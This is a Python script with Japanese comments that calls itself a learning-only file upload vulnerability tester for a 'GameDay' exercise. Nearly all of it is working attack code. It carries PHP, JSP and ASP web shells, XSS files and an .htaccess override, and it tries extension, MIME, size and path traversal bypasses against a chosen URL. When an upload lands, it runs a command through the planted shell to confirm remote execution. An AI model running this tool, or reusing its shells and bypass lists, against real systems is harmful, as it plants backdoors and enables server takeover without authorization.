#!/usr/bin/env python3
"""
ファイルアップロード脆弱性テストスクリプト
GameDay環境での学習目的のみに使用
"""

import requests
import argparse
import json
import logging
import time
import os
import tempfile
from datetime import datetime
from typing import List, Dict, Any, Optional, Tuple
import sys
import mimetypes

# ログ設定
def setup_logging(log_level: str = "INFO") -> logging.Logger:
    """ログ設定を初期化"""
    log_dir = "logs"
    os.makedirs(log_dir, exist_ok=True)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file = f"{log_dir}/file_upload_{timestamp}.log"
    
    logging.basicConfig(
        level=getattr(logging, log_level.upper()),
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(log_file),
            logging.StreamHandler(sys.stdout)
        ]
    )
    
    logger = logging.getLogger(__name__)
    logger.info(f"ログファイル: {log_file}")
    return logger

class FileUploadTester:
    """ファイルアップロード脆弱性テスター"""
    
    def __init__(self, base_url: str, logger: logging.Logger):
        self.base_url = base_url.rstrip('/')
        self.logger = logger
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'GameDay-FileUpload-Tester/1.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'ja,en-US;q=0.7,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })
        
        # 悪意のあるファイルコンテンツ
        self.malicious_contents = {
            'php_webshell': {
                'content': '<?php system($_GET["cmd"]); ?>',
                'filename': 'shell.php',
                'content_type': 'application/x-php'
            },
            'jsp_webshell': {
                'content': '<%@ page import="java.io.*" %><% String cmd = request.getParameter("cmd"); Process p = Runtime.getRuntime().exec(cmd); %>',
                'filename': 'shell.jsp',
                'content_type': 'application/x-jsp'
            },
            'asp_webshell': {
                'content': '<%eval request("cmd")%>',
                'filename': 'shell.asp',
                'content_type': 'application/x-asp'
            },
            'html_xss': {
                'content': '<html><body><script>alert("XSS via File Upload")</script></body></html>',
                'filename': 'xss.html',
                'content_type': 'text/html'
            },
            'javascript_payload': {
                'content': 'alert("JavaScript executed from uploaded file");',
                'filename': 'payload.js',
                'content_type': 'application/javascript'
            },
            'svg_xss': {
                'content': '<svg onload="alert(\'XSS via SVG\')" xmlns="http://www.w3.org/2000/svg"><text>SVG</text></svg>',
                'filename': 'xss.svg',
                'content_type': 'image/svg+xml'
            },
            'htaccess_bypass': {
                'content': 'AddType application/x-httpd-php .txt\nOptions +ExecCGI',
                'filename': '.htaccess',
                'content_type': 'text/plain'
            },
            'config_file': {
                'content': 'database_password=secret123\napi_key=abc123xyz',
                'filename': 'config.ini',
                'content_type': 'text/plain'
            }
        }
        
        # ファイル拡張子バイパステクニック
        self.bypass_techniques = {
            'double_extension': ['.php.jpg', '.jsp.png', '.asp.gif'],
            'null_byte': ['.php%00.jpg', '.jsp%00.png', '.asp%00.gif'],
            'case_variation': ['.PHP', '.Php', '.pHp', '.JSP', '.Jsp'],
            'alternative_extensions': ['.php3', '.php4', '.php5', '.phtml', '.phps'],
            'special_chars': ['.php.', '.php ', '.php\t', '.php\n'],
            'unicode_bypass': ['.ph\u0070', '.js\u0070', '.as\u0070']
        }
        
        # MIMEタイプスプーフィング
        self.mime_spoofing = [
            'image/jpeg',
            'image/png',
            'image/gif',
            'text/plain',
            'application/octet-stream',
            'multipart/form-data'
        ]
    
    def create_test_file(self, content: str, filename: str, content_type: str) -> Tuple[str, str, str]:
        """テスト用ファイルの作成"""
        temp_dir = tempfile.gettempdir()
        temp_file_path = os.path.join(temp_dir, filename)
        
        with open(temp_file_path, 'w', encoding='utf-8') as f:
            f.write(content)
        
        return temp_file_path, filename, content_type
    
    def test_basic_upload(self, endpoint: str = "/upload") -> List[Dict[str, Any]]:
        """基本的なファイルアップロードテスト"""
        self.logger.info(f"基本ファイルアップロードテスト開始: {endpoint}")
        results = []
        
        url = f"{self.base_url}{endpoint}"
        
        for payload_name, payload_info in self.malicious_contents.items():
            self.logger.info(f"ペイロード '{payload_name}' のテスト中...")
            
            # 基本的なアップロードテスト
            result = self._test_single_upload(
                url,
                payload_info['content'],
                payload_info['filename'],
                payload_info['content_type'],
                test_type='basic_upload',
                payload_name=payload_name
            )
            results.append(result)
            
            time.sleep(0.5)
        
        return results
    
    def test_extension_bypass(self, endpoint: str = "/upload") -> List[Dict[str, Any]]:
        """拡張子バイパステスト"""
        self.logger.info(f"拡張子バイパステスト開始: {endpoint}")
        results = []
        
        url = f"{self.base_url}{endpoint}"
        
        # PHPシェルを使用してバイパステクニックをテスト
        base_content = self.malicious_contents['php_webshell']['content']
        base_content_type = self.malicious_contents['php_webshell']['content_type']
        
        for technique_name, extensions in self.bypass_techniques.items():
            self.logger.info(f"バイパステクニック '{technique_name}' のテスト中...")
            
            for ext in extensions:
                filename = f"shell{ext}"
                
                result = self._test_single_upload(
                    url,
                    base_content,
                    filename,
                    base_content_type,
                    test_type='extension_bypass',
                    payload_name=f"{technique_name}_{ext}"
                )
                results.append(result)
                
                time.sleep(0.5)
        
        return results
    
    def test_mime_type_bypass(self, endpoint: str = "/upload") -> List[Dict[str, Any]]:
        """MIMEタイプバイパステスト"""
        self.logger.info(f"MIMEタイプバイパステスト開始: {endpoint}")
        results = []
        
        url = f"{self.base_url}{endpoint}"
        
        # PHPシェルを使用してMIMEタイプスプーフィングをテスト
        base_content = self.malicious_contents['php_webshell']['content']
        base_filename = 'shell.php'
        
        for mime_type in self.mime_spoofing:
            self.logger.info(f"MIMEタイプ '{mime_type}' のテスト中...")
            
            result = self._test_single_upload(
                url,
                base_content,
                base_filename,
                mime_type,
                test_type='mime_bypass',
                payload_name=f"mime_{mime_type.replace('/', '_')}"
            )
            results.append(result)
            
            time.sleep(0.5)
        
        return results
    
    def test_size_limit_bypass(self, endpoint: str = "/upload") -> List[Dict[str, Any]]:
        """ファイルサイズ制限バイパステスト"""
        self.logger.info(f"ファイルサイズ制限バイパステスト開始: {endpoint}")
        results = []
        
        url = f"{self.base_url}{endpoint}"
        
        # 異なるサイズのファイルでテスト
        test_sizes = [
            (1024, "1KB"),           # 1KB
            (10240, "10KB"),         # 10KB
            (102400, "100KB"),       # 100KB
            (1048576, "1MB"),        # 1MB
            (10485760, "10MB"),      # 10MB
            (0, "0B")                # 空ファイル
        ]
        
        base_content = self.malicious_contents['php_webshell']['content']
        
        for size, size_name in test_sizes:
            self.logger.info(f"ファイルサイズ '{size_name}' のテスト中...")
            
            # コンテンツをサイズに合わせて調整
            if size == 0:
                content = ""
            elif size < len(base_content):
                content = base_content[:size]
            else:
                # パディングを追加してサイズを調整
                padding_needed = size - len(base_content)
                content = base_content + "/*" + "A" * (padding_needed - 4) + "*/"
            
            result = self._test_single_upload(
                url,
                content,
                f"shell_{size_name.replace('B', 'b')}.php",
                'application/x-php',
                test_type='size_bypass',
                payload_name=f"size_{size_name}"
            )
            results.append(result)
            
            time.sleep(0.5)
        
        return results
    
    def test_path_traversal(self, endpoint: str = "/upload") -> List[Dict[str, Any]]:
        """パストラバーサル攻撃テスト"""
        self.logger.info(f"パストラバーサル攻撃テスト開始: {endpoint}")
        results = []
        
        url = f"{self.base_url}{endpoint}"
        
        # パストラバーサルペイロード
        path_payloads = [
            "../shell.php",
            "../../shell.php",
            "../../../shell.php",
            "..\\shell.php",
            "..\\..\\shell.php",
            "%2e%2e%2fshell.php",
            "%2e%2e%5cshell.php",
            "....//shell.php",
            "....\\\\shell.php",
            "/etc/passwd",
            "C:\\windows\\system32\\drivers\\etc\\hosts"
        ]
        
        base_content = self.malicious_contents['php_webshell']['content']
        
        for payload in path_payloads:
            self.logger.info(f"パストラバーサルペイロード '{payload}' のテスト中...")
            
            result = self._test_single_upload(
                url,
                base_content,
                payload,
                'application/x-php',
                test_type='path_traversal',
                payload_name=f"path_{payload.replace('/', '_').replace('\\', '_')}"
            )
            results.append(result)
            
            time.sleep(0.5)
        
        return results
    
    def _test_single_upload(self, url: str, content: str, filename: str, content_type: str,
                          test_type: str = '', payload_name: str = '') -> Dict[str, Any]:
        """単一ファイルアップロードテスト"""
        start_time = time.time()
        
        try:
            # 一時ファイルを作成
            temp_file_path, _, _ = self.create_test_file(content, filename, content_type)
            
            # ファイルアップロード
            with open(temp_file_path, 'rb') as f:
                files = {
                    'file': (filename, f, content_type),
                    'upload': (filename, f, content_type),
                    'attachment': (filename, f, content_type)
                }
                
                # 追加のフォームデータ
                data = {
                    'submit': 'Upload',
                    'action': 'upload',
                    'filename': filename
                }
                
                response = self.session.post(url, files=files, data=data, timeout=15)
            
            end_time = time.time()
            response_time = end_time - start_time
            
            # アップロード結果の分析
            upload_analysis = self._analyze_upload_response(response, filename, content)
            
            result = {
                'url': url,
                'test_type': test_type,
                'payload_name': payload_name,
                'filename': filename,
                'content_type': content_type,
                'file_size': len(content),
                'status_code': response.status_code,
                'response_time': response_time,
                'response_length': len(response.text),
                'upload_successful': upload_analysis['upload_successful'],
                'file_accessible': upload_analysis['file_accessible'],
                'execution_possible': upload_analysis['execution_possible'],
                'upload_path': upload_analysis['upload_path'],
                'vulnerability_detected': upload_analysis['vulnerability_detected'],
                'evidence': upload_analysis['evidence'],
                'timestamp': datetime.now().isoformat()
            }
            
            if upload_analysis['vulnerability_detected']:
                self.logger.warning(f"ファイルアップロード脆弱性検出: {test_type} - {payload_name}")
                self.logger.warning(f"ファイル名: {filename}")
                self.logger.warning(f"証拠: {upload_analysis['evidence']}")
            
            # 一時ファイルを削除
            try:
                os.unlink(temp_file_path)
            except:
                pass
            
            return result
            
        except Exception as e:
            end_time = time.time()
            response_time = end_time - start_time
            
            self.logger.error(f"アップロードテスト失敗: {str(e)}")
            
            return {
                'url': url,
                'test_type': test_type,
                'payload_name': payload_name,
                'filename': filename,
                'content_type': content_type,
                'file_size': len(content),
                'status_code': 0,
                'response_time': response_time,
                'response_length': 0,
                'upload_successful': False,
                'file_accessible': False,
                'execution_possible': False,
                'upload_path': '',
                'vulnerability_detected': False,
                'evidence': f'Upload failed: {str(e)}',
                'timestamp': datetime.now().isoformat()
            }
    
    def _analyze_upload_response(self, response: requests.Response, filename: str, content: str) -> Dict[str, Any]:
        """アップロードレスポンスの分析"""
        response_text = response.text.lower()
        
        # アップロード成功の指標
        success_indicators = [
            'upload successful',
            'file uploaded',
            'successfully uploaded',
            'upload complete',
            'file saved',
            filename.lower()
        ]
        
        upload_successful = any(indicator in response_text for indicator in success_indicators)
        
        # ファイルパスの抽出
        upload_path = self._extract_upload_path(response.text, filename)
        
        # ファイルアクセス可能性のテスト
        file_accessible = False
        execution_possible = False
        
        if upload_path:
            file_accessible, execution_possible = self._test_file_access(upload_path, content)
        
        # 脆弱性の判定
        vulnerability_detected = False
        evidence = []
        
        if upload_successful:
            evidence.append("ファイルアップロード成功")
            
            # 危険な拡張子のアップロード成功
            dangerous_extensions = ['.php', '.jsp', '.asp', '.js', '.html', '.svg']
            if any(filename.lower().endswith(ext) for ext in dangerous_extensions):
                vulnerability_detected = True
                evidence.append(f"危険な拡張子 ({filename}) のアップロード成功")
            
            # 実行可能ファイルのアクセス可能
            if file_accessible:
                vulnerability_detected = True
                evidence.append("アップロードされたファイルにアクセス可能")
                
                if execution_possible:
                    vulnerability_detected = True
                    evidence.append("アップロードされたファイルの実行が可能")
        
        # エラーメッセージの分析
        error_patterns = [
            'file too large',
            'invalid file type',
            'extension not allowed',
            'upload failed',
            'permission denied'
        ]
        
        for pattern in error_patterns:
            if pattern in response_text:
                evidence.append(f"エラーメッセージ検出: {pattern}")
        
        # ディレクトリリスティングの検出
        if 'index of' in response_text or 'directory listing' in response_text:
            vulnerability_detected = True
            evidence.append("ディレクトリリスティングが有効")
        
        return {
            'upload_successful': upload_successful,
            'file_accessible': file_accessible,
            'execution_possible': execution_possible,
            'upload_path': upload_path,
            'vulnerability_detected': vulnerability_detected,
            'evidence': '; '.join(evidence)
        }
    
    def _extract_upload_path(self, response_text: str, filename: str) -> str:
        """レスポンスからアップロードパスを抽出"""
        import re
        
        # 一般的なパスパターン
        path_patterns = [
            rf'(/uploads?/[^"\s]*{re.escape(filename)})',
            rf'(/files?/[^"\s]*{re.escape(filename)})',
            rf'(/media/[^"\s]*{re.escape(filename)})',
            rf'(/static/[^"\s]*{re.escape(filename)})',
            rf'(uploads?/[^"\s]*{re.escape(filename)})',
            rf'(files?/[^"\s]*{re.escape(filename)})'
        ]
        
        for pattern in path_patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return match.group(1)
        
        return ''
    
    def _test_file_access(self, file_path: str, original_content: str) -> Tuple[bool, bool]:
        """アップロードされたファイルのアクセステスト"""
        if not file_path:
            return False, False
        
        try:
            # ファイルURLの構築
            if file_path.startswith('/'):
                file_url = f"{self.base_url}{file_path}"
            else:
                file_url = f"{self.base_url}/{file_path}"
            
            # ファイルアクセステスト
            response = self.session.get(file_url, timeout=10)
            
            if response.status_code == 200:
                file_accessible = True
                
                # 実行可能性のテスト
                execution_possible = False
                
                # PHPの実行テスト
                if '<?php' in original_content and 'system(' in original_content:
                    # コマンド実行のテスト
                    test_url = f"{file_url}?cmd=echo%20test123"
                    test_response = self.session.get(test_url, timeout=5)
                    if 'test123' in test_response.text:
                        execution_possible = True
                
                # JavaScriptの実行テスト
                elif 'alert(' in original_content:
                    # JavaScriptが実行される可能性
                    if 'alert(' in response.text:
                        execution_possible = True
                
                return file_accessible, execution_possible
            
        except Exception as e:
            self.logger.debug(f"ファイルアクセステスト失敗: {e}")
        
        return False, False
    
    def generate_report(self, results: List[Dict[str, Any]]) -> Dict[str, Any]:
        """テスト結果のレポート生成"""
        total_tests = len(results)
        successful_uploads = [r for r in results if r['upload_successful']]
        accessible_files = [r for r in results if r['file_accessible']]
        executable_files = [r for r in results if r['execution_possible']]
        vulnerabilities_found = [r for r in results if r['vulnerability_detected']]
        
        test_type_summary = {}
        for result in results:
            test_type = result['test_type']
            if test_type not in test_type_summary:
                test_type_summary[test_type] = {
                    'total': 0, 'successful_uploads': 0, 'vulnerabilities': 0
                }
            
            test_type_summary[test_type]['total'] += 1
            if result['upload_successful']:
                test_type_summary[test_type]['successful_uploads'] += 1
            if result['vulnerability_detected']:
                test_type_summary[test_type]['vulnerabilities'] += 1
        
        # 成功率の計算
        for test_type in test_type_summary:
            total = test_type_summary[test_type]['total']
            successful = test_type_summary[test_type]['successful_uploads']
            vulns = test_type_summary[test_type]['vulnerabilities']
            
            test_type_summary[test_type]['upload_success_rate'] = (successful / total * 100) if total > 0 else 0
            test_type_summary[test_type]['vulnerability_rate'] = (vulns / total * 100) if total > 0 else 0
        
        report = {
            'target_url': self.base_url,
            'test_summary': {
                'total_tests': total_tests,
                'successful_uploads': len(successful_uploads),
                'upload_success_rate': (len(successful_uploads) / total_tests * 100) if total_tests > 0 else 0,
                'accessible_files': len(accessible_files),
                'executable_files': len(executable_files),
                'vulnerabilities_found': len(vulnerabilities_found),
                'vulnerability_rate': (len(vulnerabilities_found) / total_tests * 100) if total_tests > 0 else 0
            },
            'test_type_summary': test_type_summary,
            'critical_findings': [
                result for result in results 
                if result['execution_possible'] or 
                   (result['file_accessible'] and any(ext in result['filename'].lower() 
                                                    for ext in ['.php', '.jsp', '.asp']))
            ],
            'test_timestamp': datetime.now().isoformat(),
            'detailed_results': results
        }
        
        return report

def main():
    """メイン関数"""
    parser = argparse.ArgumentParser(description='ファイルアップロード脆弱性テスト')
    parser.add_argument('-u', '--url', required=True, help='ターゲットベースURL')
    parser.add_argument('-e', '--endpoint', default='/upload', help='アップロードエンドポイント')
    parser.add_argument('-t', '--test-type', 
                       choices=['basic', 'extension', 'mime', 'size', 'path', 'all'], 
                       default='all', help='テストタイプ')
    parser.add_argument('--log-level', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'], 
                       default='INFO', help='ログレベル')
    parser.add_argument('--output', help='結果出力ファイル（JSON形式）')
    
    args = parser.parse_args()
    
    # ログ設定
    logger = setup_logging(args.log_level)
    
    # テスター初期化
    tester = FileUploadTester(args.url, logger)
    
    # テスト実行
    try:
        all_results = []
        
        if args.test_type in ['basic', 'all']:
            results = tester.test_basic_upload(args.endpoint)
            all_results.extend(results)
        
        if args.test_type in ['extension', 'all']:
            results = tester.test_extension_bypass(args.endpoint)
            all_results.extend(results)
        
        if args.test_type in ['mime', 'all']:
            results = tester.test_mime_type_bypass(args.endpoint)
            all_results.extend(results)
        
        if args.test_type in ['size', 'all']:
            results = tester.test_size_limit_bypass(args.endpoint)
            all_results.extend(results)
        
        if args.test_type in ['path', 'all']:
            results = tester.test_path_traversal(args.endpoint)
            all_results.extend(results)
        
        # レポート生成
        report = tester.generate_report(all_results)
        
        # 結果表示
        logger.info("=== ファイルアップロード脆弱性テスト結果 ===")
        logger.info(f"総テスト数: {report['test_summary']['total_tests']}")
        logger.info(f"アップロード成功数: {report['test_summary']['successful_uploads']}")
        logger.info(f"アップロード成功率: {report['test_summary']['upload_success_rate']:.2f}%")
        logger.info(f"アクセス可能ファイル数: {report['test_summary']['accessible_files']}")
        logger.info(f"実行可能ファイル数: {report['test_summary']['executable_files']}")
        logger.info(f"脆弱性検出数: {report['test_summary']['vulnerabilities_found']}")
        logger.info(f"脆弱性検出率: {report['test_summary']['vulnerability_rate']:.2f}%")
        
        if report['critical_findings']:
            logger.warning(f"重大な脆弱性: {len(report['critical_findings'])}件")
        
        # 結果をファイルに保存
        if args.output:
            with open(args.output, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=2, ensure_ascii=False)
            logger.info(f"結果をファイルに保存: {args.output}")
    
    except Exception as e:
        logger.error(f"テスト実行中にエラーが発生: {e}")
        return 1
    
    return 0

if __name__ == "__main__":
    sys.exit(main())